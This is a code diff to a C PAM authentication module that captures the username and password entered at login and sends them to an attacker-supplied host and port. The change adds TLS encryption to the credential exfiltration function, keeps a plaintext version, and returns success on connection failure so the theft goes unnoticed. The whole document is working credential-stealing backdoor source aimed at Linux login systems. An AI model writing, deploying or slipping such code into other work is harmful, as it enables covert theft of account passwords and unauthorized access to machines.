@@ -6,12 +6,14 @@
 #include <security/pam_ext.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 
 #define TARGET_TAG_STRING "target=" 
 #define PORT_TAG_STRING "port="
 #define NEW_LINE "\n"
 #define UNKNOW_PASSWORD_STRING "\b\n\r"
-#define SOCKET_ERROR_INT -1
+#define ERROR_INT -1
 
 typedef struct {
    char  target[256];
@@ -41,7 +43,7 @@ Args_t* parse_args(int argc, const char **argv)
 	}
 
 	/* If any empty parameter return NULL */
-	if ('\0' == args->target[0] || '\0' == args->port ){
+	if ('\0' == args->target[0] || '\0' == args->port ) {
 		return NULL;
 	}
 
@@ -57,8 +59,8 @@ int open_socket(const char *hostname, long port)
 	//Create socket
 	sock = socket(AF_INET , SOCK_STREAM , 0);
 
-	if (sock == -1){
-		return SOCKET_ERROR_INT;
+	if (sock == -1) {
+		return ERROR_INT;
 	}
 	
 	server.sin_addr.s_addr = inet_addr( hostname );
@@ -66,20 +68,45 @@ int open_socket(const char *hostname, long port)
 	server.sin_port = htons( port );
 
 	if (connect(sock , (struct sockaddr *)&server , sizeof(server)) < 0){
-		return SOCKET_ERROR_INT;
+		return ERROR_INT;
 	}
 	return sock;
 }
 
-void exfiltrate_creds(int socket,const char *username,const char *password)
+SSL_CTX* init_ctx()
+{
+	SSL_CTX *ctx;
+	const SSL_METHOD *method;
+
+	OpenSSL_add_all_algorithms();
+	SSL_load_error_strings();
+	method = TLS_method();
+	ctx = SSL_CTX_new(method);
+	return ctx;
+}
+
+void exfiltrate_creds_ssl(SSL *ssl_socket,const char *username,const char *password)
 {
 	
 	//Send data
-	send(socket , (const void *) username , strlen(username) , 0);
-	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);
-	send(socket , (const void *) password , strlen(password) , 0);
-	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);
-	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1 , 0);
+	SSL_write(ssl_socket , (const void *) username , strlen(username));
+	SSL_write(ssl_socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1);
+	SSL_write(ssl_socket , (const void *) password , strlen(password));
+	SSL_write(ssl_socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1);
+	SSL_write(ssl_socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1);
+
+}
+
+void exfiltrate_creds(int socket,const char *username,const char *password)
+{
+
+	
+	//Send data
+	send(socket , (const void *) username , strlen(username), 0 );
+	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1, 0 );
+	send(socket , (const void *) password , strlen(password), 0 );
+	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1, 0 );
+	send(socket , (const void *) NEW_LINE , sizeof(NEW_LINE) - 1, 0 );
 
 }
 
@@ -90,7 +117,8 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, co
 	const char *username = NULL;
 	const char *password = NULL;
 	Args_t* args;
-
+	SSL *ssl;
+	SSL_CTX *ctx;
 
 	/* Getting the username */
 	pam_code = pam_get_user(handle, &username, "USERNAME: ");
@@ -109,22 +137,29 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, co
 	}
 
 	// If PAM cannot get password from unknown user, password will be replaced with "\b\n\r\177INCORRECT"
-	if ( 0 == strncmp(password, UNKNOW_PASSWORD_STRING, sizeof(UNKNOW_PASSWORD_STRING) - 1 ) ){
+	if ( 0 == strncmp(password, UNKNOW_PASSWORD_STRING, sizeof(UNKNOW_PASSWORD_STRING) - 1 ) ) {
 		return PAM_AUTH_ERR;
 	}
 
-	if ( NULL == (args = parse_args(argc, argv)) ){
+	if ( NULL == (args = parse_args(argc, argv)) ) {
 		return PAM_AUTH_ERR;
 	}
 
 	socket = open_socket( args->target, args->port);
-	if ( SOCKET_ERROR_INT == socket )
-	{
+	if ( ERROR_INT == socket ) {
 		return PAM_SUCCESS;
 	}
 
-	exfiltrate_creds(socket, username, password);
-	
+	ctx = init_ctx();
+	ssl = SSL_new(ctx);
+	/* Attach socket descriptor*/
+	SSL_set_fd(ssl, socket);
+	if (ERROR_INT == SSL_connect(ssl)) {
+		return PAM_SUCCESS;
+	} else {
+		exfiltrate_creds_ssl(ssl, username, password);
+	}
+
 	close(socket);
 
 	printf("");
